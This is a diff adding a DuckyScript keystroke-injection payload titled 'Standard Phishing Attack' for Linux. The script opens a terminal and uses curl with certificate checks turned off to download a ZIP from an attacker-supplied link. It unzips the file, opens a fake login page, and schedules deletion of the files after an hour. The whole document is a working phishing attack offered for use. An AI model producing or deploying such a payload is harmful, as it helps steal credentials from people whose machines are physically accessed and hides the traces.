@@ -1,0 +1,56 @@
+REM ###########################################
+REM #                                         |
+REM # Title        : Standard Phishing Attack |
+REM # Author       : Aleff                    |
+REM # Version      : 1.0                      |
+REM # Category     : Phishing                 |
+REM # Target       : Linux                    |
+REM #                                         |
+REM ###########################################
+
+REM Requirements:
+REM     - Internet Connection
+
+
+REM REQUIRED - Replace example.com/file.zip with your own ZIP link. The zip should contian the files ['login.html', 'script.js']
+DEFINE ZIP_LINK example.com/file.zip
+
+
+DELAY 1000
+CTRL-ALT t
+DELAY 2000
+
+
+REM #### Main SECTION ####
+
+
+REM Create a random directory
+STRING dir_name=$(mktemp -d)
+ENTER
+DELAY 500
+
+REM Delete the directory after 60 minutes (3600 seconds)
+STRING (sleep 3600 && rm -rf $dir_name) &
+ENTER
+DELAY 500
+
+REM Move into the directory
+STRING cd $dir_name
+ENTER
+DELAY 500
+
+REM Downloa the zip from your own link
+STRING curl -LOk "
+STRING ZIP_LINK
+STRING "
+ENTER
+DELAY 500
+
+REM Unzip it
+STRING unzip file.zip
+ENTER
+DELAY 500
+
+REM Open the login page
+STRING xdg-open login.html; exit;
+ENTER
